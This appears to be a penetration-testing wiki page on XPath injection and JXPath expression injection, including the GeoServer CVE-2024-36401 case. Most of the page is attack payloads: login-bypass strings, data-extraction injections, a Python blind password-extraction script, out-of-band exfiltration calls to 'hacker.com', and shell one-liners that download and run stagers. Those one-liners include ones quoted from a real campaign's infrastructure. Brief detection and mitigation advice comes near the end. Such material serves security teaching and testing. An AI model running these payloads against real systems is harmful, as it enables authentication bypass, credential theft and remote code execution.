# XPATH injection

{{#include ../banners/hacktricks-training.md}}

## Basic Syntax

An attack technique known as XPath Injection is utilized to take advantage of applications that form XPath (XML Path Language) queries based on user input to query or navigate XML documents.

### Nodes Described

Expressions are used to select various nodes in an XML document. These expressions and their descriptions are summarized below:

- **nodename**: All nodes with the name "nodename" are selected.
- **/**: Selection is made from the root node.
- **//**: Nodes matching the selection from the current node are selected, regardless of their location in the document.
- **.**: The current node is selected.
- **..**: The parent of the current node is selected.
- **@**: Attributes are selected.

### XPath Examples

Examples of path expressions and their results include:

- **bookstore**: All nodes named "bookstore" are selected.
- **/bookstore**: The root element bookstore is selected. It's noted that an absolute path to an element is represented by a path starting with a slash (/).
- **bookstore/book**: All book elements that are children of bookstore are selected.
- **//book**: All book elements in the document are selected, irrespective of their location.
- **bookstore//book**: All book elements that are descendants of the bookstore element are selected, no matter their position under the bookstore element.
- **//@lang**: All attributes named lang are selected.

### Utilization of Predicates

Predicates are used to refine selections:

- **/bookstore/book\[1]**: The first book element child of the bookstore element is selected. A workaround for IE versions 5 to 9, which index the first node as \[0], is setting the SelectionLanguage to XPath through JavaScript.
- **/bookstore/book\[last()]**: The last book element child of the bookstore element is selected.
- **/bookstore/book\[last()-1]**: The penultimate book element child of the bookstore element is selected.
- **/bookstore/book\[position()<3]**: The first two book elements children of the bookstore element are selected.
- **//title\[@lang]**: All title elements with a lang attribute are selected.
- **//title\[@lang='en']**: All title elements with a "lang" attribute value of "en" are selected.
- **/bookstore/book\[price>35.00]**: All book elements of the bookstore with a price greater than 35.00 are selected.
- **/bookstore/book\[price>35.00]/title**: All title elements of the book elements of the bookstore with a price greater than 35.00 are selected.

### Handling of Unknown Nodes

Wildcards are employed for matching unknown nodes:

- **\***: Matches any element node.
- **@**\*: Matches any attribute node.
- **node()**: Matches any node of any kind.

Further examples include:

- **/bookstore/\***: Selects all the child element nodes of the bookstore element.
- **//\***: Selects all elements in the document.
- **//title\[@\*]**: Selects all title elements with at least one attribute of any kind.

## Example

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
    <name>pepe</name>
    <password>peponcio</password>
    <account>admin</account>
</user>
<user>
    <name>mark</name>
    <password>m12345</password>
    <account>regular</account>
</user>
<user>
    <name>fino</name>
    <password>fino2</password>
    <account>regular</account>
</user>
</data>
```

### Access the information

```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```

### Identify & stealing the schema

```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
    <a>
        <b></b>
    </a>
    <c>
        <d></d>
        <e></e>
        <f>
            <h></h>
        </f>
    </c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```

## Authentication Bypass

### **Example of queries:**

```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```

### **OR bypass in user and password (same value in both)**

```
' or '1'='1
" or "1"="1
' or ''=' 
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```

### **Abusing null injection**

```
Username: ' or 1]%00
```

### **Double OR in Username or in password** (is valid with only 1 vulnerable field)

IMPORTANT: Notice that the **"and" is the first operation made**.

```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2ยบ account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```

## String extraction

The output contains strings and the user can manipulate the values to search:

```
/user/username[contains(., '+VALUE+')]
```

```
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```

## Blind Explotation

### **Get length of a value and extract it by comparisons:**

```bash
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''=' #True if length equals 4
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''=' #True is first equals "a"

substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)

... and ( if ( $employee/role = 2 ) then error() else 0 )... #When error() is executed it rises an error and never returns a value
```

### **Python Example**

```python
import requests, string

flag = ""
l = 0
alphabet = string.ascii_letters + string.digits + "{}_()"
for i in range(30):
    r = requests.get("http://example.com?action=user&userid=2 and string-length(password)=" + str(i))
    if ("TRUE_COND" in r.text):
        l = i
        break
print("[+] Password length: " + str(l))
for i in range(1, l + 1): #print("[i] Looking for char number " + str(i))
    for al in alphabet:
        r = requests.get("http://example.com?action=user&userid=2 and substring(password,"+str(i)+",1)="+al)
        if ("TRUE_COND" in r.text):
            flag += al
            print("[+] Flag: " + flag)
            break
```

### Read file

```python
(substring((doc('file://protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
```

## OOB Exploitation

```python
doc(concat("http://hacker.com/oob/", RESULTS))
doc(concat("http://hacker.com/oob/", /Employees/Employee[1]/username))
doc(concat("http://hacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

#Instead of doc() you can use the function doc-available
doc-available(concat("http://hacker.com/oob/", RESULTS))
#the doc available will respond true or false depending if the doc exists,
#user not(doc-available(...)) to invert the result if you need to
```

### Automatic tool

- [xcat](https://xcat.readthedocs.io/)
- [xxxpwn](https://github.com/feakk/xxxpwn)
- [xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart)
- [xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
- [XmlChor](https://github.com/Harshal35/XMLCHOR)

---

## JXPath Expression Injection in Java (Commons JXPath)

Apache Commons JXPath evaluates XPath-like expressions over Java object graphs (JavaBeans, collections, Maps). It supports extension functions that bridge directly to Java constructors, static methods, and instance methods. If untrusted input is evaluated by JXPath, an attacker can invoke arbitrary Java methods and reach OS command execution sinks.

Key capability (from JXPath docs):
- Create objects: `com.pkg.Class.new('arg')`
- Call static methods: `com.pkg.Class.staticMethod('arg')`
- Call instance methods: `methodName(targetObject, arg1, ...)` or chain calls

Typical RCE primitive via extension functions:

```text
# Direct static/instance invocation
java.lang.Runtime.getRuntime().exec('sh -c id')

# Or via ProcessBuilder
java.lang.ProcessBuilder.new({'/bin/sh','-c','curl http://x/x | sh'}).start()
```

Note: The exact quoting and argument style depends on how the vulnerable code passes the attacker-controlled string to `JXPathContext.getValue(...)`, `iterate(...)` or `iteratePointers(...)`.

### GeoServer RCE via JXPath (CVE-2024-36401)

Multiple GeoServer endpoints feed user-controlled path expressions into GeoTools property evaluators, which select a PropertyAccessor that eventually calls `JXPathContextReferenceImpl.iteratePointers(String xpath)` with attacker-controlled input. During evaluation, JXPath resolves an ExtensionFunction that can map to `java.lang.Runtime.getRuntime().exec(...)` (or similar), leading to OS command execution.

Confirmed entry points (per NVD/GeoServer):
- WFS/WMS/WPS requests including `GetFeature`, `GetPropertyValue`, `GetMap`, `GetFeatureInfo`, `GetLegendGraphic`, `Execute`.

Simplified data flow:

```text
request.valueReference --> propertyNameNoIndexes --> GeoTools evaluate(...)
--> PropertyAccessor.findPropertyAccessors(...)
--> accessor.get(attPath)
--> JXPathContextReferenceImpl.iteratePointers(attPath)
--> ExtensionFunction.computeValue(...) resolves to Runtime.exec
``;

Example exploitation pattern (conceptual):

```text
# valueReference or similar parameter contains a JXPath expression
java.lang.Runtime.getRuntime().exec({'/bin/sh','-c','wget http://attacker/z593 -O /tmp/z593; chmod +x /tmp/z593; /tmp/z593'})
```

### Two-stage delivery pattern observed in the wild

- Stage 1: Use the RCE primitive to download a stager from attacker infrastructure (self-hosted transfer.sh on port 8080), e.g. fetch `z593`.
- Stage 2: Trigger RCE again to execute the downloaded stager. The stager retrieves helper scripts (e.g., `z401`, `z402`) to hide files and launch the main binary (often a Dart-compiled ELF) with an app key. The main binary may be an unmodified, vendor SDK used to monetize victim bandwidth with low EDR footprint.

Example Linux one-liners:

```bash
# download
/bin/sh -c "curl -fsSL http://37.187.74.75:8080/3twwHaJzxo/z593 -o /tmp/z593 || wget -qO /tmp/z593 http://37.187.74.75:8080/3twwHaJzxo/z593" 
# execute
/bin/sh -c "chmod +x /tmp/z593 && /tmp/z593"
```

### Detection and hunting tips

Network:
- Look for outbound HTTP(S) to uncommon transfer.sh instances on port 8080 and random high-entropy paths distributing artifacts like `a401/a402/.../z593` and log files `*log`.
- Inspect WFS/WMS/WPS traffic for suspicious `valueReference` or similar parameters containing strings such as `java.lang.Runtime`, `.new(`, `ProcessBuilder`, or function-like syntax typical of JXPath extension functions.

Host:
- Recent creation of hidden directories following GeoServer requests; presence of Dart-compiled ELF binaries; files/scripts named `z401`, `z402`, `*593`, and corresponding `*log` files; processes started with SDK app keys.

### Mitigations
- Upgrade GeoServer to a version that remediates CVE-2024-36401.
- Do not evaluate untrusted expressions with JXPath. Where possible, disable extension function resolution or enforce strict allowlists of permissible property paths (no class/method names, no constructors).
- Add validation/normalization for parameters like `valueReference` and block patterns indicating Java method invocation.
- Monitor for JVM child processes (shells/OS commands) spawned from GeoServer.
- Egress controls to block unapproved file-sharing services and known distribution hosts/ports observed in campaigns.

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
- [https://wiki.owasp.org/index.php/Testing_for_XPath_Injection\_(OTG-INPVAL-010)](<https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)>)
- [https://www.w3schools.com/xml/xpath_syntax.asp](https://www.w3schools.com/xml/xpath_syntax.asp)
- [Unit 42: Your Connection, Their Cash โ CVE-2024-36401 GeoServer/JXPath RCE campaign](https://unit42.paloaltonetworks.com/attackers-sell-your-bandwidth-using-sdks/)
- [Apache Commons JXPath 1.4.0 API โ Extension Functions](https://commons.apache.org/proper/commons-jxpath/apidocs/index.html#Extension_Functions)
- [NVD: CVE-2024-36401](https://nvd.nist.gov/vuln/detail/CVE-2024-36401)

{{#include ../banners/hacktricks-training.md}}